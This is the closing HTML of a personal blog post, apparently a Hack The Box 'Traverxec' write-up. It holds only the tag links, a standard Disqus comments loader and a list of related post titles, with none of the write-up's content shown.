+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">CTF</span>
+    </a>
+  
+    
+    <a href="/tags/#hack-the-box">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">Hack The Box</span>
+    </a>
+  
+    
+    <a href="/tags/#linux">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">Linux</span>
+    </a>
+  
+</div>
+  </div>
+
+  
+  <section class="comments">
+    <h2>Comments</h2>
+    
+  <div id="disqus_thread">
+    <button class="disqus-load" onClick="loadDisqusComments()">
+      Load Comments
+    </button>
+  </div>
+  <script>
+
+  /**
+  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW
+  *  TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT:s
+  *  https://disqus.com/admin/universalcode/#configuration-variables
+  */
+  var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/hack-the-box-craft-traverxec/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "" || "http://0.0.0.0:4000/hack-the-box-craft-traverxec/";// Replace PAGE_IDENTIFIER with your page's unique identifier variable
+  }
+  function loadDisqusComments() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = '//https-ryankozak-com.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+  }
+  </script>
+  <noscript>
+    Please enable JavaScript to view the
+    <a href="https://disqus.com/?ref_noscript">comments powered by Disqus</a>.
+  </noscript>
+
+
+
+  </section>
+
+  <section class="related">
+  <h2>Related Posts</h2>
+  <ul class="posts-list">
+    
+      <li>
+        <h3>
+          <a href="/luks-encrypted-arch-linux-on-pinebook-pro/">
+            Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root
+            <small>15 Dec 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box-craft-traceback/">
+            Hack The Box - Traceback
+            <small>17 Aug 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/plenty-of-phish-trust-and-gtlds/">
+            Plenty of Phish: Users, Trust and gTLDs
+            <small>28 Jan 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</section>
+
+</div>
+
+    </main>
+
+    
+  </body>
+</html>
